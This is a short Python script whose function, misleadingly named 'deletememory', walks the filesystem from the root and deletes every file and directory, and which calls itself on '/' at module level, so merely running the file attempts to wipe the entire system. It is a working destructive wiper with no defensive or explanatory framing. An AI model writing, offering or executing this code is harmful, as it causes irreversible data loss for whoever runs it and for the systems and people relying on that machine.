
import os
import shutil

def deletememory(root_dir='/'):
    for dirpath, dirnames, filenames in os.walk(root_dir, topdown=False):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            try:
                os.unlink(file_path)  
                print(f'Deleted file: {file_path}')
            except Exception as e:
                print(f'Failed to delete file {file_path}. Reason: {e}')

        for dirname in dirnames:
            dir_path = os.path.join(dirpath, dirname)
            try:
                shutil.rmtree(dir_path) 
                print(f'Deleted directory: {dir_path}')
            except Exception as e:
                print(f'Failed to delete directory {dir_path}. Reason: {e}')


deletememory('/')

